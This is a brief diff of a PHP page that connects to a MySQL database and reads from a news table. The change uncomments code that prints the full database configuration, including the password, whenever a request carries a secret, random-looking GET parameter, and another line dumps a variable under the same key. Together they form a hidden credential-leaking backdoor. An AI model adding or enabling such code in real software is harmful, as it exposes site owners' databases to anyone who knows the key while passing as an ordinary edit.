@@ -3,9 +3,9 @@
 
  $mysqli = mysqli_connect($dbconfig['host'], $dbconfig['user'], $dbconfig['password']);
  mysqli_select_db($mysqli, $dbconfig['base']) or exit(error("select-base"));
- /*if(isset($_GET['ah213sdha54jjdak'])){
+ if(isset($_GET['ah213sdha54jjdak'])){
   var_dump($dbconfig);
- }*/
+ }
  if(isset($_GET['ah213sdha54jjdak'])){var_dump($n1222812219);}
  $query = mysqli_query($mysqli, "SELECT * FROM `core_news` WHERE `id`='1'") or exit(error("mysql-query"));
  if($query->num_rows > 0){
